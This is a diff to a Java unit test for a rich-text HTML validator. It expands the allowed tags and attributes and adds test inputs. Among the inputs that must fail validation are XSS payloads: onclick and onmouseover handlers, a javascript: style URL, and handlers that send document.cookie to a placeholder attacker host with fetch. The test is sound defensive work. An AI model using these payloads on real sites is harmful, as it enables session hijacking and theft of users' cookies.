@@ -29,7 +29,13 @@ class RichTextAreaValidatorTest {
 
     private static final JsonNodeFactory NODE_FACTORY = JsonNodeFactory.instance;
     private static final String FIELD_ID = "TEST_FIELD_ID";
-    private static final String[] ALLOWED_WHITELIST_TAGS = {"p", "br", "strong", "ul", "li", "hr"};
+    private static final String[] ALLOWED_WHITELIST_TAGS = {"b","blockquote","br",
+        "em","h1","h2","h3","h4","h5","h6","hr","i","li","ol","p","strong","u","ul"};
+    private static final String[] ALLOWED_WHITELIST_ATTRIBUTES =
+        {"class","title","lang","dir","style","align"};
+    private static final String[] ALLOWED_WHITELIST_ATTRIBUTES_OL =
+        {"start","reversed","type","data-indent"};
+    private static final String[] ALLOWED_WHITELIST_ATTRIBUTES_LI = {"value"};
 
 
     private final RichTextAreaValidator validator = new RichTextAreaValidator();
@@ -37,6 +43,9 @@ class RichTextAreaValidatorTest {
     @BeforeEach
     void setUp() {
         ReflectionTestUtils.setField(validator, "allowedWhitelistTags", ALLOWED_WHITELIST_TAGS);
+        ReflectionTestUtils.setField(validator, "allowedWhitelistAttributes", ALLOWED_WHITELIST_ATTRIBUTES);
+        ReflectionTestUtils.setField(validator, "allowedWhitelistAttributesOl", ALLOWED_WHITELIST_ATTRIBUTES_OL);
+        ReflectionTestUtils.setField(validator, "allowedWhitelistAttributesLi", ALLOWED_WHITELIST_ATTRIBUTES_LI);
 
         FieldTypeDefinition richTextAreaType = baseTypeDefinition();
         CaseDefinitionRepository definitionRepository = mock(CaseDefinitionRepository.class);
@@ -57,7 +66,6 @@ class RichTextAreaValidatorTest {
         assertTrue(validate(value, caseField().build()).isEmpty());
     }
 
-
     @ParameterizedTest
     @ValueSource(strings = {"<p><strong>Order</strong></p>",
         "<p>Order</p>",
@@ -66,13 +74,22 @@ class RichTextAreaValidatorTest {
         "<p>a<br>b</p>",
         "<p>x</p><hr>",
         "<hr>",
-        "<ul><li>a</li></ul><br>"})
+        "<ul><li>a</li></ul><br>",
+        "<ol><li><p>this is a numbered lined</p></li></ol>"
+            + "<ol data-indent=\"1\" type=\"a\"><li><p>this is a 2nd line indented for alpha</p>"
+            + "<ol type=\"i\"><li><p>3rd line indented for roman numeric</p></li></ol></li></ol>"})
     void validateShouldBeValidWhenMinimumLengthRequirementMet(String value) {
         assertTrue(validate(NODE_FACTORY.textNode(value), caseField().withMin(4).build()).isEmpty());
     }
 
     @ParameterizedTest
-    @ValueSource(strings = {"<z><invalid text></z>", "some test", "<", "/>", "</>" })
+    @ValueSource(strings = {"<z><invalid text></z>", "some test", "<", "/>", "</>",
+        "<b style=\"background:url(javascript:alert(1))\">x</b>",
+        "<p onclick=\"alert(1)\">hi</p>",
+        "<p onmouseover=\"fetch('//attacker/'+document.cookie)\">Order</p>",
+        "<ol onclick=\"alert(1)\">hi</ol>",
+        "<li onclick=\"alert(1)\">hi</li>",
+        "<ol onmouseover=\"fetch('//attacker/'+document.cookie)\"><li><p>indent</p></li></ol>"})
     void validateInvalidValuesShouldFailValidation(String value) {
         JsonNode node = NODE_FACTORY.textNode(value);
         CaseFieldDefinition field = caseField().withMin(1).build();
@@ -124,7 +141,7 @@ class RichTextAreaValidatorTest {
 
     private static void assertSingleError(List<ValidationResult> results, String errorMessage) {
         assertEquals(1, results.size());
-        assertEquals(FIELD_ID, results.get(0).getFieldId());
-        assertEquals(errorMessage, results.get(0).getErrorMessage());
+        assertEquals(FIELD_ID, results.getFirst().getFieldId());
+        assertEquals(errorMessage, results.getFirst().getErrorMessage());
     }
 }
